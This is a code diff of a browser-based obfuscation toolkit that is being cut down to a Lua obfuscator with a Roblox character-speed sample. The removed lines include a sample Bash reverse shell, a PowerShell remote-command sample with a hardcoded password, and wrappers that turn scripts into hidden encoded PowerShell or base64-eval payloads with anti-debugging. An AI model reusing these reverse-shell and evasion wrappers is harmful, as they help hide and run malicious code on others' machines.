+  document.getElementById('login-form').style.display=t==='login'?'':'none';
+  document.getElementById('register-form').style.display=t==='register'?'':'none';
 }
-
-function handleLogin(e) {
+function handleLogin(e){
   e.preventDefault();
-  const user  = document.getElementById('login-user').value.trim();
-  const pass  = document.getElementById('login-pass').value;
-  const errEl = document.getElementById('login-error');
-  errEl.className = 'auth-error'; errEl.textContent = '';
-  if (!user || !pass) { errEl.textContent = 'Please enter both username and password.'; return; }
-  const users = getUsers(), u = users[user];
-  if (!u)                            { errEl.textContent = 'User not found.'; return; }
-  if (u.password !== simpleHash(pass)){ errEl.textContent = 'Incorrect password.'; return; }
-  const session = { username: user, role: u.role, loginAt: Date.now() };
-  setSession(session); enterApp(session);
+  const u=document.getElementById('login-user').value.trim(),p=document.getElementById('login-pass').value,err=document.getElementById('login-error');
+  err.className='auth-error';err.textContent='';
+  if(!u||!p){err.textContent='Please fill both fields.';return}
+  const users=getUsers(),user=users[u];
+  if(!user){err.textContent='User not found.';return}
+  if(user.password!==simpleHash(p)){err.textContent='Incorrect password.';return}
+  const s={username:u,role:user.role,loginAt:Date.now()};setSession(s);enterApp(s);
 }
-
-function handleGoogleLogin() {
-  const errEl = document.getElementById('reg-error');
-  errEl.className = 'auth-error'; errEl.textContent = 'Authenticating with Google...';
-  setTimeout(() => {
-    const randId   = Math.random().toString(36).substring(2, 8);
-    const username = `user_${randId}`;
-    const users    = getUsers();
-    if (!users[username]) {
-      users[username] = { password: 'google_oauth_bypass', role: 'user', created: Date.now() };
-      setUsers(users);
-    }
-    errEl.className = 'auth-error ok'; errEl.textContent = 'Success! Signing you in...';
-    setTimeout(() => {
-      const session = { username, role: 'user', loginAt: Date.now() };
-      setSession(session); enterApp(session);
-    }, 800);
-  }, 1200);
+function handleGoogleLogin(){
+  const err=document.getElementById('reg-error');
+  err.className='auth-error';err.textContent='Authenticating…';
+  setTimeout(()=>{
+    const id=Math.random().toString(36).substring(2,8),uname='user_'+id;
+    const users=getUsers();
+    if(!users[uname])users[uname]={password:'google_bypass',role:'user',created:Date.now()};
+    setUsers(users);
+    err.className='auth-error ok';err.textContent='Success! Signing in…';
+    setTimeout(()=>{const s={username:uname,role:'user',loginAt:Date.now()};setSession(s);enterApp(s);},800);
+  },1200);
 }
-
-function enterApp(session) {
+function enterApp(s){
   document.getElementById('auth-screen').classList.add('hidden');
-  document.getElementById('app-shell').style.display = '';
-  document.getElementById('user-name').textContent   = session.username;
-  document.getElementById('user-avatar').textContent = session.username[0].toUpperCase();
-  const roleEl = document.getElementById('user-role');
-  roleEl.textContent    = session.role === 'admin' ? 'ADMIN' : 'USER';
-  roleEl.style.background = session.role === 'admin' ? 'rgba(245,158,11,.15)' : 'var(--accent-lo)';
-  roleEl.style.color      = session.role === 'admin' ? '#fbbf24'              : 'var(--accent-hi)';
+  document.getElementById('app-shell').style.display='';
+  document.getElementById('user-name').textContent=s.username;
+  document.getElementById('user-avatar').textContent=s.username[0].toUpperCase();
+  const r=document.getElementById('user-role');
+  r.textContent=s.role==='admin'?'ADMIN':'USER';
+  r.style.background=s.role==='admin'?'rgba(245,158,11,.15)':'var(--accent-lo)';
+  r.style.color=s.role==='admin'?'#fbbf24':'var(--accent-hi)';
   document.getElementById('login-form').reset();
-  document.getElementById('login-error').textContent = '';
-  document.getElementById('reg-error').textContent   = '';
-  switchAuthTab('login');
-  // restore hash route or go home
-  const hash = location.hash.slice(1) || 'home';
-  navigate(hash);
+  document.getElementById('login-error').textContent='';
 }
-
-function logout() {
+function logout(){
   clearSession();
-  document.getElementById('app-shell').style.display = 'none';
+  document.getElementById('app-shell').style.display='none';
   document.getElementById('auth-screen').classList.remove('hidden');
   document.getElementById('login-form').reset();
-  document.getElementById('login-error').textContent = '';
-  history.replaceState(null, '', location.pathname);
 }
 
-// ══════════════════════════════════════════
-//  NAVIGATION + HASH ROUTING
-// ══════════════════════════════════════════
-function navigate(id) {
-  if (!getSession()) { logout(); return; }
-  history.replaceState(null, '', '#' + id);
-  document.querySelectorAll('.tool-panel').forEach(p => p.classList.remove('active'));
-  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-  const panel = document.getElementById(id + '-panel') || document.getElementById('home-panel');
-  panel.classList.add('active');
-  document.querySelectorAll('.nav-item').forEach(n => {
-    if ((n.getAttribute('onclick') || '').includes(`'${id}'`)) n.classList.add('active');
-  });
-  document.getElementById('main-area').scrollTop = 0;
-}
+/* ═══════════════════════════════════════════
+   UI HELPERS
+═══════════════════════════════════════════ */
+function toggleOpt(el){el.classList.toggle('checked');updateStrength()}
 
-window.addEventListener('popstate', () => {
-  if (getSession()) navigate(location.hash.slice(1) || 'home');
-});
-
-// ══════════════════════════════════════════
-//  TOOL REGISTRY + DASHBOARD
-// ══════════════════════════════════════════
-const TOOLS = [
-  { id:'js-obf',       name:'JS Obfuscator',      cat:'Obfuscator', icon:'code'   },
-  { id:'ps-obf',       name:'PowerShell Obf.',    cat:'Obfuscator', icon:'term'   },
-  { id:'bash-obf',     name:'Bash Obfuscator',    cat:'Obfuscator', icon:'shell'  },
-  { id:'lua-obf',      name:'Lua Obfuscator',     cat:'Obfuscator', icon:'lua'    },
-  { id:'base64',       name:'Base64',             cat:'Encode',     icon:'shield' },
-  { id:'url-enc',      name:'URL Encode',         cat:'Encode',     icon:'globe'  },
-  { id:'hex-enc',      name:'Hex',                cat:'Encode',     icon:'hex'    },
-  { id:'html-enc',     name:'HTML Entity',        cat:'Encode',     icon:'tag'    },
-  { id:'xor',          name:'XOR Cipher',         cat:'Cipher',     icon:'x'      },
-  { id:'rot',          name:'ROT13 / ROT-N',      cat:'Cipher',     icon:'rotate' },
-  { id:'caesar',       name:'Caesar Cipher',      cat:'Cipher',     icon:'clock'  },
-  { id:'hash',         name:'Hash Generator',     cat:'Hash',       icon:'hash'   },
-  { id:'string-tools', name:'String Tools',       cat:'Utility',    icon:'text'   },
-  { id:'charcode',     name:'Char Code',          cat:'Utility',    icon:'kb'     },
-  { id:'diff',         name:'Text Diff',          cat:'Utility',    icon:'diff'   },
-  { id:'regex',        name:'Regex Tester',       cat:'Utility',    icon:'search' },
-];
-
-const ICONS = {
-  code:   `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M14.5 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V7.5L14.5 2z"/><polyline points="14 2 14 8 20 8"/><path d="M10 12l-2 2 2 2"/><path d="M14 12l2 2-2 2"/></svg>`,
-  term:   `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8m-4-4v4"/><path d="M7 8l3 2-3 2m5 0h3"/></svg>`,
-  shell:  `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 17l6-6-6-6"/><path d="M12 19h8"/></svg>`,
-  lua:    `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><circle cx="17" cy="7" r="2" fill="currentColor" stroke="none"/></svg>`,
-  shield: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>`,
-  globe:  `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/></svg>`,
-  hex:    `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 7h3m0 0v10m0-10h2a3 3 0 010 6H7m7 0h4m-4 4h4M14 7v10"/></svg>`,
-  tag:    `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>`,
-  x:      `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6L6 18M6 6l12 12"/><circle cx="12" cy="12" r="10"/></svg>`,
-  rotate: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M23 4v6h-6"/><path d="M20.49 15a9 9 0 11-2.12-9.36L23 10"/></svg>`,
-  clock:  `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 8v4l3 3"/></svg>`,
-  hash:   `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg>`,
-  text:   `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 6h16M4 12h16M4 18h7"/></svg>`,
-  kb:     `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="6" width="20" height="12" rx="2"/><path d="M6 10h.01M12 10h.01M18 10h.01M6 14h12"/></svg>`,
-  diff:   `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg>`,
-  search: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>`,
-};
-
-function buildDash() {
-  document.getElementById('dash-grid').innerHTML = TOOLS.map(t =>
-    `<div class="dash-card" onclick="navigate('${t.id}')">
-      <div class="dash-card-icon">${ICONS[t.icon] || ''}</div>
-      <div class="dash-card-name">${t.name}</div>
-      <div class="dash-card-cat">${t.cat}</div>
-    </div>`
-  ).join('');
-}
-
-// ══════════════════════════════════════════
-//  COMMAND PALETTE
-// ══════════════════════════════════════════
-let cmdSelected = 0;
-
-function cmdOpen() {
-  document.getElementById('cmd-overlay').classList.add('open');
-  document.getElementById('cmd-search').value = '';
-  cmdFilter();
-  setTimeout(() => document.getElementById('cmd-search').focus(), 50);
-}
-function cmdClose(e) {
-  if (!e || e.target === document.getElementById('cmd-overlay'))
-    document.getElementById('cmd-overlay').classList.remove('open');
-}
-function cmdFilter() {
-  const q    = document.getElementById('cmd-search').value.toLowerCase();
-  const hits = TOOLS.filter(t => t.name.toLowerCase().includes(q) || t.cat.toLowerCase().includes(q));
-  cmdSelected = 0;
-  const el = document.getElementById('cmd-results');
-  if (!hits.length) { el.innerHTML = '<div class="cmd-empty">No tools match.</div>'; return; }
-  el.innerHTML = hits.map((t, i) =>
-    `<div class="cmd-item ${i === 0 ? 'selected' : ''}" data-id="${t.id}"
-       onmouseenter="cmdSelect(${i})" onclick="cmdGo('${t.id}')">
-      ${ICONS[t.icon] ? `<span style="color:var(--accent-hi);display:flex;align-items:center;width:16px;height:16px;">${ICONS[t.icon]}</span>` : ''}
-      ${t.name}
-      <span class="cmd-item-cat">${t.cat}</span>
-    </div>`
-  ).join('');
-}
-function cmdSelect(i) {
-  cmdSelected = i;
-  document.querySelectorAll('.cmd-item').forEach((el, j) => el.classList.toggle('selected', i === j));
-}
-function cmdKey(e) {
-  const items = document.querySelectorAll('.cmd-item');
-  if      (e.key === 'ArrowDown') { cmdSelect(Math.min(cmdSelected + 1, items.length - 1)); e.preventDefault(); }
-  else if (e.key === 'ArrowUp')   { cmdSelect(Math.max(cmdSelected - 1, 0)); e.preventDefault(); }
-  else if (e.key === 'Enter' && items[cmdSelected]) cmdGo(items[cmdSelected].dataset.id);
-  else if (e.key === 'Escape') cmdClose();
-}
-function cmdGo(id) {
-  document.getElementById('cmd-overlay').classList.remove('open');
-  navigate(id);
-}
-document.addEventListener('keydown', e => {
-  if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
-    e.preventDefault();
-    if (getSession()) cmdOpen();
-  }
-  if (e.key === 'Escape' && document.getElementById('cmd-overlay').classList.contains('open')) {
-    cmdClose();
-  }
-});
-
-// ══════════════════════════════════════════
-//  SHARED HELPERS
-// ══════════════════════════════════════════
-function getOpts(cid) {
-  const o = {};
-  document.querySelectorAll(`#${cid} .opt-item`).forEach(el => { o[el.dataset.key] = el.classList.contains('checked'); });
+function getOpts(){
+  const o={};
+  document.querySelectorAll('.opt-item[data-key]').forEach(el=>{o[el.dataset.key]=el.classList.contains('checked')});
+  o.nameStyle=document.getElementById('name-style').value;
+  o.passes=parseInt(document.getElementById('rename-passes').value)||1;
   return o;
 }
-function toggleOpt(el) { el.classList.toggle('checked'); }
-function clearField(a, b) { document.getElementById(a).value = ''; document.getElementById(b).value = ''; }
 
-// Copy with toast feedback
-function copyOutput(id) {
-  const v = document.getElementById(id).value;
-  if (!v) return;
-  navigator.clipboard.writeText(v).catch(() => {
-    const ta = document.getElementById(id); ta.select(); document.execCommand('copy');
+function setOpts(cfg){
+  document.querySelectorAll('.opt-item[data-key]').forEach(el=>{
+    if(cfg.hasOwnProperty(el.dataset.key)){
+      if(cfg[el.dataset.key])el.classList.add('checked');else el.classList.remove('checked');
+    }
   });
-  let toast = document.getElementById('_copy-toast');
-  if (!toast) {
-    toast = document.createElement('div');
-    toast.id = '_copy-toast';
-    toast.style.cssText = [
-      'position:fixed;top:60px;right:20px;z-index:3000',
-      'background:var(--bg-3);border:1px solid var(--border-hi)',
-      'color:var(--ok);font-family:var(--mono);font-size:12px',
-      'padding:8px 14px;border-radius:6px',
-      'box-shadow:0 4px 20px rgba(0,0,0,.4)',
-      'transition:opacity .25s;pointer-events:none;opacity:0'
-    ].join(';');
-    toast.textContent = '✓  copied to clipboard';
-    document.body.appendChild(toast);
-  }
-  clearTimeout(toast._t);
-  toast.style.opacity = '1';
-  toast._t = setTimeout(() => { toast.style.opacity = '0'; }, 1800);
+  if(cfg.nameStyle)document.getElementById('name-style').value=cfg.nameStyle;
+  if(cfg.passes)document.getElementById('rename-passes').value=String(cfg.passes);
+  updateStrength();
 }
 
-function swapFields(a, b) {
-  const va = document.getElementById(a).value, vb = document.getElementById(b).value;
-  document.getElementById(a).value = vb; document.getElementById(b).value = va;
-}
-function downloadText(id, fn) {
-  const v = document.getElementById(id).value;
-  if (!v) return;
-  const a = document.createElement('a');
-  a.href = 'data:text/plain;charset=utf-8,' + encodeURIComponent(v);
-  a.download = fn; a.click();
-}
-function loadSample(id, text) { document.getElementById(id).value = text; }
+const PRESETS={
+  off:{stripComments:false,minify:false,renameLocals:false,renameParams:false,renameGlobals:false,encodeStrings:false,splitStrings:false,encodeNumbers:false,encodeNumbersExpr:false,junkVars:false,junkBlocks:false,doEndWrap:false,tableProxy:false,loadstringWrap:false,doublePack:false,obfWrapper:false},
+  light:{stripComments:true,minify:true,renameLocals:true,renameParams:true,renameGlobals:false,encodeStrings:true,splitStrings:true,encodeNumbers:true,encodeNumbersExpr:false,junkVars:false,junkBlocks:false,doEndWrap:false,tableProxy:false,loadstringWrap:true,doublePack:false,obfWrapper:false,nameStyle:'hex',passes:1},
+  strong:{stripComments:true,minify:true,renameLocals:true,renameParams:true,renameGlobals:false,encodeStrings:true,splitStrings:true,encodeNumbers:true,encodeNumbersExpr:true,junkVars:true,junkBlocks:true,doEndWrap:true,tableProxy:true,loadstringWrap:true,doublePack:false,obfWrapper:true,nameStyle:'chaos',passes:2},
+  nuclear:{stripComments:true,minify:true,renameLocals:true,renameParams:true,renameGlobals:true,encodeStrings:true,splitStrings:true,encodeNumbers:true,encodeNumbersExpr:true,junkVars:true,junkBlocks:true,doEndWrap:true,tableProxy:true,loadstringWrap:true,doublePack:true,obfWrapper:true,nameStyle:'chaos',passes:3}
+};
 
-let _noticeTimers = {};
-function notice(id, type, msg) {
-  const el = document.getElementById(id);
-  el.className = 'notice ' + type + ' show';
-  el.textContent = msg;
-  clearTimeout(_noticeTimers[id]);
-  _noticeTimers[id] = setTimeout(() => el.classList.remove('show'), 4000);
+function applyPreset(name){
+  document.querySelectorAll('.preset-btn').forEach(b=>b.classList.remove('active'));
+  const btn=document.getElementById('preset-'+name);
+  if(btn)btn.classList.add('active');
+  if(PRESETS[name])setOpts(PRESETS[name]);
 }
 
-// ══════════════════════════════════════════
-//  SAMPLES
-// ══════════════════════════════════════════
-const jsSample = `function calculateDiscount(price, percent) {
-  var discount = price * (percent / 100);
-  var finalPrice = price - discount;
-  var message = "Your discount: $" + discount.toFixed(2);
-  console.log(message);
-  return finalPrice;
+function updateStrength(){
+  const o=getOpts();
+  const pts=[o.stripComments,o.minify,o.renameLocals,o.renameParams,o.renameGlobals,o.encodeStrings,o.splitStrings,o.encodeNumbers,o.encodeNumbersExpr,o.junkVars,o.junkBlocks,o.doEndWrap,o.tableProxy,o.loadstringWrap,o.doublePack,o.obfWrapper];
+  const on=pts.filter(Boolean).length;
+  const pct=Math.round(on/pts.length*100);
+  const fill=document.getElementById('strength-fill');
+  const label=document.getElementById('strength-label');
+  fill.style.width=pct+'%';
+  if(pct===0){fill.style.background='var(--text-3)';label.textContent='None';label.style.color='var(--text-3)'}
+  else if(pct<40){fill.style.background='var(--ok)';label.textContent='Light';label.style.color='var(--ok)'}
+  else if(pct<70){fill.style.background='var(--warn)';label.textContent='Strong';label.style.color='var(--warn)'}
+  else{fill.style.background='var(--danger)';label.textContent='Nuclear';label.style.color='var(--danger)'}
 }
-var items = ["apple", "banana", "cherry"];
-items.forEach(function(item) { console.log("Processing: " + item); });`;
 
-const psSample = `$username = "admin"
-$password = ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force
-$cred = New-Object System.Management.Automation.PSCredential($username, $password)
-Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami; ipconfig /all }`;
+let _noticeT;
+function notice(type,msg){
+  const el=document.getElementById('lua-notice');
+  el.className='notice notice-'+type+' show';el.textContent=msg;
+  clearTimeout(_noticeT);_noticeT=setTimeout(()=>el.classList.remove('show'),5000);
+}
 
-const bashSample = `#!/bin/bash
-TARGET="192.168.1.1"
-PORT=4444
-bash -i >& /dev/tcp/$TARGET/$PORT 0>&1`;
+function copyOutput(){
+  const v=document.getElementById('lua-out').value;if(!v)return;
+  navigator.clipboard.writeText(v).catch(()=>{});
+  let t=document.getElementById('_toast');
+  if(!t){t=document.createElement('div');t.id='_toast';t.style.cssText='position:fixed;top:60px;right:20px;z-index:3000;background:var(--bg-3);border:1px solid var(--border-hi);color:var(--ok);font-family:var(--mono);font-size:12px;padding:8px 14px;border-radius:6px;box-shadow:0 4px 20px rgba(0,0,0,.4);transition:opacity .25s;pointer-events:none;opacity:0';document.body.appendChild(t)}
+  t.textContent='✓  copied';clearTimeout(t._t);t.style.opacity='1';t._t=setTimeout(()=>t.style.opacity='0',1800);
+}
 
-const luaSample = `local function getPlayer(name)
-  local players = game:GetService("Players")
-  local target = players:FindFirstChild(name)
-  if target then return target.Character end
-  return nil
+function downloadOutput(){
+  const v=document.getElementById('lua-out').value;if(!v)return;
+  const a=document.createElement('a');a.href='data:text/plain;charset=utf-8,'+encodeURIComponent(v);a.download='obfuscated.lua';a.click();
+}
+
+function loadSample(){
+  document.getElementById('lua-in').value=`-- Player utility module
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+local function getLocalPlayer()
+  return Players.LocalPlayer
 end
-local player = getPlayer("Idris")
-if player then print("Found: " .. player.Name) end`;
 
-// ══════════════════════════════════════════
-//  OBFUSCATORS
-// ══════════════════════════════════════════
-function obfuscateJS() {
-  const src = document.getElementById('js-in').value.trim();
-  if (!src) { notice('js-notice', 'notice-warn', 'No input.'); return; }
-  const opts = getOpts('js-opts');
-  let out = src;
+local function getCharacter(player)
+  player = player or getLocalPlayer()
+  if not player then return nil end
+  return player.Character or player.CharacterAdded:Wait()
+end
 
-  if (opts.renameVars) {
-    const varNames = new Map(); let counter = 0;
-    const genName = () => {
-      const chars = 'O0lI1'; let n = '', c = counter++;
-      do { n = chars[c % 5] + n; c = Math.floor(c / 5) - 1; } while (c >= 0);
-      return '_' + n;
-    };
-    out = out.replace(/\b(var|let|const)\s+([a-zA-Z_$][a-zA-Z0-9_$]*)/g, (m, kw, name) => {
-      if (!varNames.has(name)) varNames.set(name, genName());
-      return kw + ' ' + varNames.get(name);
-    });
-    varNames.forEach((nn, on) => { out = out.replace(new RegExp('\\b' + on + '\\b', 'g'), nn); });
-  }
-  if (opts.encodeStrings) {
-    const enc = s => Array.from(s).map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
-    out = out.replace(/"((?:[^"\\]|\\.)*)"/g, (m, i) => '"' + enc(i) + '"')
-             .replace(/'((?:[^'\\]|\\.)*)'/g, (m, i) => "'" + enc(i) + "'");
-  }
-  if (opts.hexLiterals) {
-    out = out.replace(/\b(\d+)\b/g, (m, n) => { const v = parseInt(n); return v > 9 ? '0x' + v.toString(16) : m; });
-  }
-  if (opts.deadCode) {
-    const dead = ['if(0x0){void 0;}', 'var _d=function(){return false;}();', 'try{undefined();}catch(e){}'];
-    const lines = out.split('\n'), inj = [];
-    lines.forEach((l, i) => { inj.push(l); if (i % 5 === 2) inj.push(dead[i % dead.length]); });
-    out = inj.join('\n');
-  }
-  if (opts.controlFlow) {
-    out = `(function(_0x){var _st='${btoa('arch').replace(/=/g, '')}';eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}('${out.replace(/'/g, "\\'").replace(/\n/g, '\\n')}',0,0,''.split('|'),0,{}));})(this);`;
-  }
-  if (opts.selfDefend) {
-    out = `(function(){var _x=function(){return true;};if(typeof _x!=='function'){(function(){}).constructor('debugger')();}(function(){var _y=new RegExp('(((.+)+)+)+$');_y.test('arch-hub');})();${out}})();`;
-  }
+local function getHumanoid(player)
+  local char = getCharacter(player)
+  if not char then return nil end
+  return char:FindFirstChildOfClass("Humanoid")
+end
 
-  document.getElementById('js-out').value = out;
-  const ratio = (out.length / src.length).toFixed(2) + 'x';
-  document.getElementById('js-ratio').textContent = ratio;
-  document.getElementById('js-stats').style.display = '';
-  notice('js-notice', 'notice-ok', `Obfuscated — ${src.length} → ${out.length} chars`);
+local function setWalkSpeed(speed)
+  local hum = getHumanoid()
+  if hum then
+    hum.WalkSpeed = speed
+    print("WalkSpeed set to " .. tostring(speed))
+  end
+end
+
+local function setJumpPower(power)
+  local hum = getHumanoid()
+  if hum then
+    hum.JumpPower = power
+    print("JumpPower set to " .. tostring(power))
+  end
+end
+
+-- Initialize
+setWalkSpeed(32)
+setJumpPower(60)`;
 }
 
-function obfuscatePS() {
-  const src = document.getElementById('ps-in').value.trim();
-  if (!src) { notice('ps-notice', 'notice-warn', 'No input.'); return; }
-  const method = document.getElementById('ps-method').value;
-  let out = '';
+/* ═══════════════════════════════════════════
+   LUA TOKENIZER
+═══════════════════════════════════════════ */
+const LUA_KEYWORDS=new Set(['and','break','do','else','elseif','end','false','for','function','goto','if','in','local','nil','not','or','repeat','return','then','true','until','while']);
+const LUA_STD=new Set(['print','pairs','ipairs','next','select','type','tostring','tonumber','rawget','rawset','rawequal','rawlen','require','load','loadstring','dofile','loadfile','pcall','xpcall','error','assert','unpack','table','string','math','io','os','coroutine','package','debug','setmetatable','getmetatable','setfenv','getfenv','_G','_ENV','_VERSION','game','workspace','script','Instance','Vector3','CFrame','tick','wait','spawn','delay','Enum','UDim','UDim2','Color3','Vector2','BrickColor','task','warn','typeof']);
 
-  if (method === 'tick') {
-    out = src.replace(/([a-zA-Z]{2,})/g, m => {
-      if (m.length < 3) return m;
-      let r = '';
-      for (let i = 0; i < m.length; i++) { r += m[i]; if (i > 0 && i < m.length - 1 && Math.random() > 0.6) r += '`'; }
-      return r;
-    });
-  } else if (method === 'char') {
-    const chars = Array.from(src).map(c => `[char]0x${c.charCodeAt(0).toString(16)}`).join('+');
-    out = `& ([scriptblock]::Create(${chars}))`;
-  } else if (method === 'b64') {
-    // ✅ FIXED: UTF-16LE encoding required by PowerShell -EncodedCommand
-    const buf = new Uint8Array(src.length * 2);
-    for (let i = 0; i < src.length; i++) {
-      const c = src.charCodeAt(i);
-      buf[i * 2]     = c & 0xFF;
-      buf[i * 2 + 1] = c >> 8;
+function tokenizeLua(src){
+  const tokens=[];let i=0;
+  while(i<src.length){
+    // block comment / long comment
+    if(src[i]==='-'&&src[i+1]==='-'){
+      let lv=-1,j=i+2;
+      if(src[j]==='['){let k=j+1,l=0;while(src[k]==='='){l++;k++}if(src[k]==='['){lv=l;j=k}}
+      if(lv>=0){
+        const cl=']'+'='.repeat(lv)+']';const ei=src.indexOf(cl,j+1);
+        if(ei!==-1){tokens.push({t:'BC',v:src.slice(i,ei+cl.length)});i=ei+cl.length;continue}
+      }
+      const nl=src.indexOf('\n',i);const e=nl===-1?src.length:nl;
+      tokens.push({t:'LC',v:src.slice(i,e)});i=e;continue;
     }
-    let bin = '';
-    buf.forEach(b => bin += String.fromCharCode(b));
-    const encoded = btoa(bin);
-    out = `powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand ${encoded}\n\n# IEX variant:\n$e="${encoded}"\n$d=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($e))\nIEX $d`;
-  } else if (method === 'caserand') {
-    out = Array.from(src).map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
-  } else {
-    // combo
-    let step = Array.from(src).map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
-    step = step.replace(/([a-zA-Z]{3,})/g, m => {
-      if (m.length < 4) return m;
-      const mid = Math.floor(m.length / 2);
-      return `("${m.slice(0, mid)}"+"${m.slice(mid)}")`;
-    });
-    out = step.replace(/([a-zA-Z]{2,})/g, m => {
-      let r = '';
-      for (let i = 0; i < m.length; i++) { r += m[i]; if (i > 0 && i < m.length - 1 && Math.random() > 0.65) r += '`'; }
-      return r;
-    });
+    // long string
+    if(src[i]==='['){
+      let j=i+1,lv=0;while(src[j]==='='){lv++;j++}
+      if(src[j]==='['){
+        const cl=']'+'='.repeat(lv)+']';const ei=src.indexOf(cl,j+1);
+        if(ei!==-1){tokens.push({t:'LS',v:src.slice(i,ei+cl.length)});i=ei+cl.length;continue}
+      }
+    }
+    // double-quoted string
+    if(src[i]==='"'){
+      let j=i+1,s='"';
+      while(j<src.length&&src[j]!=='"'){
+        if(src[j]==='\\'&&j+1<src.length){s+=src[j]+src[j+1];j+=2}else{s+=src[j];j++}
+      }
+      s+='"';j++;tokens.push({t:'S',v:s,q:'d'});i=j;continue;
+    }
+    // single-quoted string
+    if(src[i]==="'"){
+      let j=i+1,s="'";
+      while(j<src.length&&src[j]!=="'"){
+        if(src[j]==='\\'&&j+1<src.length){s+=src[j]+src[j+1];j+=2}else{s+=src[j];j++}
+      }
+      s+="'";j++;tokens.push({t:'S',v:s,q:'s'});i=j;continue;
+    }
+    // number
+    const nm=src.slice(i).match(/^0[xX][0-9a-fA-F]+(?:\.[0-9a-fA-F]*)?(?:[pP][+-]?\d+)?|^\d+(?:\.\d*)?(?:[eE][+-]?\d+)?/);
+    if(nm){tokens.push({t:'N',v:nm[0]});i+=nm[0].length;continue}
+    // identifier / keyword
+    const im=src.slice(i).match(/^[a-zA-Z_][a-zA-Z0-9_]*/);
+    if(im){const w=im[0];tokens.push({t:LUA_KEYWORDS.has(w)?'K':'I',v:w});i+=w.length;continue}
+    // whitespace
+    const wm=src.slice(i).match(/^[ \t]+/);
+    if(wm){tokens.push({t:'W',v:wm[0]});i+=wm[0].length;continue}
+    // newline
+    if(src[i]==='\r'&&src[i+1]==='\n'){tokens.push({t:'NL',v:'\r\n'});i+=2;continue}
+    if(src[i]==='\n'||src[i]==='\r'){tokens.push({t:'NL',v:src[i]});i++;continue}
+    // multi-char operators
+    const o3=src.slice(i,i+3);if(o3==='...'){tokens.push({t:'O',v:'...'});i+=3;continue}
+    const o2=src.slice(i,i+2);
+    if(['==','~=','<=','>=','..','::','//','>>','<<'].includes(o2)){tokens.push({t:'O',v:o2});i+=2;continue}
+    tokens.push({t:'O',v:src[i]});i++;
   }
-
-  document.getElementById('ps-out').value = out;
-  notice('ps-notice', 'notice-ok', `Done — method: ${method}`);
+  return tokens;
 }
 
-function obfuscateBash() {
-  const src = document.getElementById('bash-in').value.trim();
-  if (!src) { notice('bash-notice', 'notice-warn', 'No input.'); return; }
-  const method = document.getElementById('bash-method').value;
-  let out = '';
+function tokensToString(tokens){return tokens.map(t=>t.v).join('')}
 
-  if (method === 'b64') {
-    const encoded = btoa(unescape(encodeURIComponent(src)));
-    out = `#!/bin/bash\neval "$(echo '${encoded}' | base64 --decode)"`;
-  } else if (method === 'hex') {
-    const oct = Array.from(src).map(c => '\\0' + c.charCodeAt(0).toString(8).padStart(3, '0')).join('');
